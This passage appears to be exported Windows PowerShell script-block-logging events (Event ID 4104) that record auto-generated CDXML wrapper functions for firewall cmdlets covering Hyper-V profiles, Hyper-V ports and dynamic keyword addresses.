        { @('ByName', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Profile')) {
            [object]$__cmdletization_value = ${Profile}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profile'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profile'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefaultInboundAction')) {
            [object]$__cmdletization_value = ${DefaultInboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefaultOutboundAction')) {
            [object]$__cmdletization_value = ${DefaultOutboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
   

ScriptBlock ID: 0153011a-3ea2-4323-8856-76307efc78a4
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 3):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallHyperVProfile'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetFirewallHyperVProfile
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('VMCreatorId')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowLocalFirewallRules},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Profile')) {
          [object]$__cmdletization_value = ${Profile}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profile'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profile'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefaultInboundAction')) {
          [object]$__cmdletization_value = ${DefaultInboundAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefaultOutboundAction')) {
          [object]$__cmdletization_value = ${DefaultOutboundAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowLocalFirewallRules')) {
          [object]$__cmdletization_value = ${AllowLocalFirewallRules}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetFirewallHyperVProfile' -Alias '*'
        

function Get-NetFirewallHyperVProfile
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVProfile')]

    param(
    
    [Parameter(ParameterSetName='ByQuery', Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile[]]
    ${Profile},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean[]]
    ${AllowLocalFirewallRules},

 

ScriptBlock ID: 0153011a-3ea2-4323-8856-76307efc78a4
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallHyperVPort'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallHyperVPort
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVPort')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${SwitchName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PortName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${InterfaceGuid},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PartitionGuid},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.ConstrainedInterfaceType[]]
    ${Constrained},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile[]]
    ${Profile},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.NetworkType[]]
    ${NetworkType},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('SwitchName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${SwitchName})
        $__cmdletization_queryBuilder.FilterByProperty('SwitchName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PortName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PortName})
        $__cmdletization_queryBuilder.FilterByProperty('PortName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InterfaceGuid') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InterfaceGuid})
        $__cmdletization_queryBuilder.FilterByProperty('InterfaceGuid', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PartitionGuid') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PartitionGuid})
        $__cmdletization_queryBuilder.FilterByProperty('PartitionGuid', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Constrained') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Constrained})
        $__cmdletization_queryBuilder.FilterByProperty('Constrained', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Profile') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Profile})
        $__cmdletization_queryBuilder.FilterByProperty('Profile', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('NetworkType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${NetworkType})
        $__cmdletization_queryBuilder.FilterByProperty('NetworkType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVPort.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallHyperVPort' -Alias '*'
        


ScriptBlock ID: c60de405-ebfd-4915-9cba-be1d4c91f1e1
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (2 of 2):
; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Append'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UpdateDynamicKeywordAddress', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallDynamicKeywordAddress.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Update-NetFirewallDynamicKeywordAddress' -Alias '*'
        

function Get-NetFirewallDynamicKeywordAddress
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallDynamicKeywordAddress')]

    param(
    
    [Parameter(ParameterSetName='ById', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
    ${Id},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AllAutoResolve},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AllNonAutoResolve},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Id') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Id})
        $__cmdletization_queryBuilder.FilterByProperty('Id', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ById', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('AllAutoResolve') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('AllAutoResolve', ${AllAutoResolve})
    }
    if ($PSBoundParameters.ContainsKey('AllNonAutoResolve') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('AllNonAutoResolve', ${AllNonAutoResolve})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallDynamicKeywordAddress.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallDynamicKeywordAddress' -Alias '*'
        

function Remove-NetFirewallDynamicKeywordAddress
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallDynamicKeywordAddress')]

    param(
    
    [Parameter(ParameterSetName='ById', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
